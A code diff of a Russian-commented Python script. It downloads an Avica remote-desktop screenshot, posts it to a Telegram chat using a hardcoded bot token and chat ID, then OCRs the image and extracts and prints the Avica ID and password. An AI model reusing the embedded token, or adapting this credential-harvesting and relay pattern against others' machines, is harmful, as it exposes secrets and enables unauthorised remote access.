@@ -1,17 +1,18 @@
-from flask import Flask, request, jsonify
 from PIL import Image
 import pytesseract
 import requests
 import re
 import os
-
-app = Flask(__name__)
+import time
 
 # =========================
-# Telegram настройки (прямо, без Secrets)
+# Telegram настройки (прямо)
 # =========================
 TELEGRAM_TOKEN = "5713086959:AAEsY9YIe4bkBE_VIYorOvBkXgsp-5XR_Og"
 CHAT_ID = 1047092792  # число, не строка
+
+# URL скрина Avica
+SCREENSHOT_URL = "https://example.com/avica_screenshot.png"  # <-- сюда твой реальный скриншот
 
 def send_to_telegram(file_path, caption="Avica Screenshot"):
     """Отправляем картинку в Telegram"""
@@ -28,37 +29,19 @@ def send_to_telegram(file_path, caption="Avica Screenshot"):
     else:
         print("[!] Telegram upload failed")
 
-# =========================
-# Flask routes
-# =========================
-@app.route("/")
-def home():
-    return "Avica OCR API is running 🚀"
-
-@app.route("/ocr", methods=["POST"])
-def ocr_avica():
-    """
-    JSON пример запроса:
-    {
-        "url": "https://example.com/avica_screenshot.png"
-    }
-    """
-    data = request.json
-    if not data or "url" not in data:
-        return jsonify({"error": "Missing 'url' in JSON"}), 400
-
-    img_url = data["url"]
+def main():
     img_path = "/tmp/screenshot.png"
 
     # 1️⃣ Скачиваем скриншот
     try:
-        resp = requests.get(img_url)
+        resp = requests.get(SCREENSHOT_URL)
         resp.raise_for_status()
         with open(img_path, "wb") as f:
             f.write(resp.content)
         print("[+] Screenshot downloaded")
     except Exception as e:
-        return jsonify({"error": f"Failed to download image: {e}"}), 400
+        print("[!] Failed to download image:", e)
+        return
 
     # 2️⃣ Отправляем скрин в Telegram
     try:
@@ -70,9 +53,11 @@ def ocr_avica():
     try:
         img = Image.open(img_path)
         text = pytesseract.image_to_string(img)
-        print("[+] OCR done")
+        print("[+] OCR done:")
+        print(text)
     except Exception as e:
-        return jsonify({"error": f"OCR failed: {e}"}), 500
+        print("[!] OCR failed:", e)
+        return
 
     # 4️⃣ Ищем ID и Password через регулярку
     id_match = re.search(r"(ID|Login|User)[\s:]*([A-Za-z0-9]+)", text, re.IGNORECASE)
@@ -81,15 +66,11 @@ def ocr_avica():
     avica_id = id_match.group(2) if id_match else None
     avica_pass = pass_match.group(2) if pass_match else None
 
-    return jsonify({
-        "id": avica_id,
-        "password": avica_pass,
-        "raw_text": text
-    })
+    print("[+] Parsed credentials:")
+    print("ID:", avica_id)
+    print("Password:", avica_pass)
 
-# =========================
-# Запуск Flask
-# =========================
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host="0.0.0.0", port=port)
+    # Даем контейнеру немного прогрузиться
+    time.sleep(5)
+    main()
